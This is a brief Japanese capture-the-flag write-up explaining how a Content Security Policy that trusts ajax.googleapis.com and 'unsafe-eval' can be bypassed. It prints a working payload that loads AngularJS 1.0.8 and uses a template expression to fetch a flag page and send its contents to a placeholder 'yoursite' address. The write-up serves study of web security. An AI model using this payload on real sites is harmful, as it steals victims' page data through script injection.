
'''

# 前提知識

- CSP Bypass（jsフレームワークを経由）

# 解説

CSPの設定を見る。

```
content-security-policy: 
    script-src 'self' ajax.googleapis.com 'unsafe-eval'; 
    default-src 'self' 'unsafe-inline'; 
    connect-src *; 
    report-uri /csp_report
```

`ajax.googleapis.com`のjsは許可されている。  
これはjsフレームワークによるバイパスが行えそうだ。  
参考：[Content Security Policy Level 3におけるXSS対策 - pixiv inside](https://inside.pixiv.blog/kobo/5137)

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js"></script>
<p ng-app>{{constructor.constructor('fetch("/csp-two-flag").then(x=>x.text()).then(x=>location="yoursite?q="+escape(x))')()}}
```

これでサイトに情報が突っ込まれる。

'''